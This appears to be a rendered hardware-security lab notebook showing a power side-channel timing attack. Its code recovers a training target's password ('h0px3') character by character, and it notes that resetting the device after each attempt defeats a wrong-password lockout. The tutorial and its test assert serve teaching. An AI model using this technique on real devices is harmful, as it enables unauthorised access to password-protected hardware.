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","dtype":"float64","shape":[2000]}},"selected":{"id":"1165","type":"Selection"},"selection_policy":{"id":"1164","type":"UnionRenderers"}},"id":"1141","type":"ColumnDataSource"},{"attributes":{"formatter":{"id":"1160","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{},"id":"1158","type":"BasicTickFormatter"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{"overlay":{"id":"1161","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1138","type":"Line"},{"attributes":{"source":{"id":"1141","type":"ColumnDataSource"}},"id":"1145","type":"CDSView"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{"data_source":{"id":"1141","type":"ColumnDataSource"},"glyph":{"id":"1142","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1143","type":"Line"},"selection_glyph":null,"view":{"id":"1145","type":"CDSView"}},"id":"1144","type":"GlyphRenderer"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1143","type":"Line"},{"attributes":{"text":""},"id":"1155","type":"Title"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"4e782c07-fda0-44c8-9543-df46d323d8d6","roots":{"1102":"f1e0ff64-a4b8-47cc-b506-351f36c7a4e1"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that:

-  Figures out our next guess
-  Does the capture and records the trace
-  Checks if sample 217 is larger than -0.2 (replace with appropriate
   values)

To make things a little easier for later, we'll make a function that
will return whether our spike is (guess incorrect) or isn't (guess
correct) in the right location:


**In [15]:**

.. code:: ipython3

    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if checkpass(trace, 0):
            print("Success: " + c)
            break


**Out [16]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: h
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [17]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [17]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0p
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method:

-  The target device has a finite start-up time, which slows down the
   attack. If you wish, remove some of the ``printf()``'s from the
   target code, recompile and reprogram, and see how quickly you can do
   this attack.
-  The current script doesn't look for the "WELCOME" message when the
   password is OK. That is an extension that allows it to crack any size
   password.
-  If there was a lock-out on a wrong password, the system would ignore
   it, as it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [18]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [19]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

